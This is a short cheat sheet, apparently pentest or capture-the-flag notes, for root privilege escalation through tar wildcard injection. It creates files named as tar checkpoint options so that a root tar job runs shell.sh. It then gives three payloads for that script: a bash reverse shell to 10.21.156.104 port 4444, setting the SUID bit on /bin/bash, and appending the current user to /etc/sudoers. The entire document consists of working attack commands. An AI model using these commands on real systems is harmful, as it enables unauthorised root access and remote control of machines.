
```
touch ./"--checkpoint=1"
```

```
touch ./"--checkpoint-action=exec=sh shell.sh"
```

##### Reverse Shell

```
nano shell.sh --> /bin/bash -c "/bin/bash -i >& /dev/tcp/10.21.156.104/4444 0>&1"
```

```
chmod +x shell.sh
```

If shell doesn't work try:

###### SUID Bash

```
nano shell.sh
#!/bin/bash

/bin/chmod u+s /bin/bash
```
##### Adding current user to sudoers file

```
nano shell.sh
#!/bin/bash

echo "$(whoami) ALL=(ALL:ALL) ALL" >> /etc/sudoers
```